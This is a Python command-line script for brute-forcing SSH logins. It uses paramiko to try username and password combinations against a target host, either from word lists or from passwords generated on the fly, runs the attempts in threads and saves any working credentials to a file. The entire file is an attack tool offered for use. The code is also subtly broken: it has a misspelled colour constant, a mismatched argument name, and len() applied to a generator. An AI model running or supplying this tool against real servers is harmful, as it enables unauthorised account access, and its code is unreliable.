import paramiko
import socket
import time
from colorama import init, Fore
import itertools
import string
import argparse 
from threading import Thread
import queue
import sys


init()

GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESEST
RED = Fore.RED

q = queue.Queue()

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password)
    except socket.timeout:
        print(f"{RED}[-] Host: {hostname} is unreachable. Time out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[-] Invalid credentials fro {username}:{password}")
    except paramiko.SSHException:
        print(f"{BLUE} [*] Retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN} Found combo: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines

def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for passwords in itertools.product(chars, repeat=length):
            yield ''.join(passwords) 

def worker(host):
    while not q.empty():
        username, password = q.get()
        if is_ssh_open(host, username, password):
            with open('credentials.txt', 'w') as f:
                f.write(f"{username}@{host}:{password}")
            q.queue.clear()
            break
        q.task_done()

def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforce.")
    parser.add_argument('host', help='Hostname or IP address of ssh server.')
    parser.add_argument('-P', '--passlist', help='Passwords list to bruteforce ssh.')
    parser.add_argument('-u', '--user', help='Single username to use.')
    parser.add_argument('-U', '--userlist', help='Usernames list to brutefroce ssh.')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate passwords on the fly.')
    parser.add_argument('--min_length', type=int, help='The minimum length to generate passwords.')
    parser.add_argument('--max_length', type=int, help='The maximum length to generate passwords.')
    parser.add_argument('-c', '--chars', type=str, help='Characters to use for password generation.')
    parser.add_argument('-t', '--threads', type=int, help='Number of threads to use', default=4)

    args = parser.parse_args()
    host = args.host
    threads = args.threads

    if not args.user and not args.userlist:
        print("Please provide a single username or a usernames file.")
        sys.exit(1)

    if args.userslist:
        users = load_lines(args.userlist)
    else:
        users = [args.user]
    if args.passlist:
        passwords = load_lines(args.passlist)
    elif args.generate:
        passwords = generate_passwords(args.min_length, args.max_length, args.chars)
    else:
        print('Please provide a password list or specify to generate passwords.')
        sys.exit(1)
    if args.passlist:
        print(f'[+] Usernames to try: {len(users)}')
        print(f'[+] Passwords to try: {len(passwords)}')
    else:
        print(f'[+] Usernames to try: {len(users)}')
        print(f'[+] Generating passwords on the fly.')

    for user in users:
        for password in passwords:
            q.put((user, password))

    for _ in range(threads):
        thread = Thread(target=worker, args=(host,))
        thread.daemon = True
        thread.start()

    q.join()

if __name__ == '__main__':
    main()